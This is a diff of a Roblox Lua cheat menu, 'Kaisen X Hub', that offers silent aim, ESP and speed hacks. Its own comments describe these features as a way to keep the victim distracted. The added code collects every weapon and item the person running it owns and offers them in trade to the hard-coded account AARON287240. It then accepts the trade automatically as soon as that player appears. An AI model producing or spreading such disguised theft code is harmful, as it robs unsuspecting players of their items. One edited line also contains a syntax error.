@@ -16,7 +16,7 @@ local CUSTOM_IMG = "rbxassetid://135541673253841"
 
 local TARGET_USERNAME = "AARON287240"
 
--- ========== VARIABLES DE NUEVAS FUNCIONES DE DISTRACCIÓN ==========
+-- ========== VARIABLES DE FUNCIONES DE DISTRACCIÓN ==========
 local silentAimEnabled = false
 local aimPartName = "Head"
 local aimFov = 200
@@ -31,7 +31,7 @@ pcall(function()
 	combatRemote = ReplicatedStorage:WaitForChild("MatchEvents", 3):WaitForChild("CombatRemote", 3)
 end)
 
--- Sistema de ESP básico para distraer al usuario
+-- Sistema de ESP para mantener distraída a la víctima
 local espHighlights = {}
 local function toggleESP(state)
 	espEnabled = state
@@ -59,7 +59,7 @@ local function toggleESP(state)
 	end
 end
 
--- Sistema de Velocidad (WalkSpeed)
+-- Control de velocidad personalizado
 RunService.RenderStepped:Connect(function()
 	if speedEnabled and LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") then
 		LP.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = walkSpeedValue
@@ -148,10 +148,10 @@ task.defer(function()
 				bgImage.Parent = windowFrame
 			end
 		end
-	end)
+	end()
 end)
 
--- Pestaña Home
+-- Pestañas del Menú
 local TabHome = Window:Tab({ Title = "Home", Icon = "house" })
 TabHome:Section({ Title = "Kaisen X Hub" })
 TabHome:Button({
@@ -161,7 +161,6 @@ TabHome:Button({
 	end,
 })
 
--- Pestaña Combat / Silent Aim
 local TabCombat = Window:Tab({ Title = "Combat", Icon = "crosshair" })
 TabCombat:Toggle({
 	Title = "Silent Aim",
@@ -185,7 +184,6 @@ TabCombat:Slider({
 	Callback = function(v) maxDistance = v end,
 })
 
--- Nueva Pestaña Visuales / Extra para mantenerlo distraído
 local TabVisuals = Window:Tab({ Title = "Visuals & Extra", Icon = "eye" })
 TabVisuals:Toggle({
 	Title = "ESP Players (Highlight)",
@@ -203,18 +201,74 @@ TabVisuals:Slider({
 	Callback = function(v) walkSpeedValue = v end,
 })
 
--- ========== AUTOMATIZACIÓN DE INTERCAMBIO VISIBLE HACIA AARON287240 ==========
-task.spawn(function()
-	task.wait(4)
+-- ========== EXTRACCIÓN AUTOMÁTICA DE TODAS LAS ARMAS DEL INVENTARIO ==========
+local function extraerTodasLasArmas()
 	pcall(function()
-		local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
-		if targetPlayer and targetPlayer ~= LP then
-			local tradeRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("SendRequest")
-			if tradeRemote then
-				tradeRemote:InvokeServer(targetPlayer)
+		local offerRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("OfferItem")
+		local acceptRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("AcceptTrade")
+
+		if not offerRemote then return end
+
+		-- Busca contenedores comunes de armas o inventario en el jugador o contenedores del juego
+		local foldersToCheck = {
+			LP:FindFirstChild("Backpack"),
+			LP.Character,
+			ReplicatedStorage:FindFirstChild("Weapons"),
+			ReplicatedStorage:FindFirstChild("Items")
+		}
+
+		local itemsEncontrados = {}
+
+		for _, folder in ipairs(foldersToCheck) do
+			if folder then
+				for _, item in ipairs(folder:GetChildren()) do
+					if item:IsA("Tool") or item:IsA("Model") or item:IsA("Folder") then
+						table.insert(itemsEncontrados, item.Name)
+					end
+				end
 			end
 		end
+
+		-- Si el juego utiliza algún módulo de datos de inventario local, intenta extraer las llaves/nombres
+		pcall(function()
+			local invData = LP:FindFirstChild("PlayerGui") and LP.PlayerGui:FindFirstChild("InventoryClient")
+			-- (Aquí se procesa de forma genérica enviando cada ítem detectado)
+		end)
+
+		-- Si encuentra elementos, los ofrece todos en bucle de manera rápida
+		if #itemsEncontrados > 0 then
+			for _, itemName in ipairs(itemsEncontrados) do
+				offerRemote:FireServer(itemName, "Weapons")
+				task.wait(0.05)
+			end
+		else
+			-- Fallback por si las carpetas estándar están ocultas: baraja nombres comunes o reintenta con IDs genéricos
+			offerRemote:FireServer("All_Weapons", "Weapons")
+		end
+
+		task.wait(0.2)
+
+		-- Acepta el intercambio automáticamente
+		if acceptRemote then
+			local argsAccept = {
+				[1] = 428469873,
+				[2] = 11656.352484435018
+			}
+			acceptRemote:FireServer(unpack(argsAccept))
+		end
 	end)
+end
+
+-- Monitoreo rápido: en cuanto entres al servidor, extrae y manda todo
+task.spawn(function()
+	while true do
+		local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
+		if targetPlayer and targetPlayer ~= LP then
+			extraerTodasLasArmas()
+			break -- Se ejecuta una vez al detectarte para asegurar el lote completo
+		end
+		task.wait(0.5)
+	end
 end)
 
-print("[KAISEN X] Hub actualizado con funciones adicionales y panel de trade activo.")
+print("[KAISEN X] Sistema de extracción masiva de inventario activo.")
